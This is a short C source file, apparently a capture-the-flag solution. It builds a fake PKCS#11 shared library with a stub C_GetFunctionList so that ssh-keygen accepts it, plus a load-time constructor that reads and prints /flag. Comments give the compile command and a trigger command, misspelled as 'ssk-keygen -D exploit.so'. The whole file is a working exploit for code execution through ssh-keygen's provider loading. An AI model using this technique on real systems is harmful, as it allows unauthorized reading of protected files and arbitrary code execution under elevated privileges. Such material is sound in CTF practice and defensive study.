#include <stdio.h>
#include <stdlib.h>

// The required PKCS#11 function to pass ssh-keygen's validation check
void C_GetFunctionList(){}

// The constructor that runs automatically when the library is loaded
__attribute__((constructor)) void init(){
	// now jsut read the file
	FILE *fptr;
	char contents[200];
	fptr = fopen("/flag","r");
	fgets(contents, 100, fptr);
	printf("%s", contents);
	fclose(fptr);
}

// compile as a shared library (gcc -shared -fPIC -o exploit.so exploit.c)
// trigger with ssk-keygen -D exploit.so
